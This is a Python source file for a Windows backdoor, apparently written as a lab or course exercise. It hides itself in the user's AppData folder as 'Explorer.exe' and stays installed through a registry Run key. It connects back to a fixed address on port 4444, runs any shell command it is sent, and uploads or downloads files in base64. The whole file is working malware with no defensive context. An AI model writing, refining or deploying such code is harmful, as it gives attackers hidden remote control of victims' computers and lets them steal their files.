#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def persistence(self):
        hidden_location = os.environ["appdata"] + "\\Explorer.exe"
        if not os.path.exists(hidden_location):
            shutil.copyfile(sys.executable, hidden_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' +
                            hidden_location + '"', shell=True)

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(
            'utf-8')

    def change_working_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Upload  of" + path + " successful"

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.receive()

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.change_working_dir(command[1])
                elif command[0] == "download":
                    command_output = self.read_file(command[1])
                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])
                else:
                    command_output = self.execute_command(command)
            except Exception as e:
                command_output = "[-] Error during command execution." + str(e)

            self.send(command_output)


try:
    new_backdoor = Backdoor("192.168.116.136", 4444)
    new_backdoor.run()
except Exception:
    sys.exit()
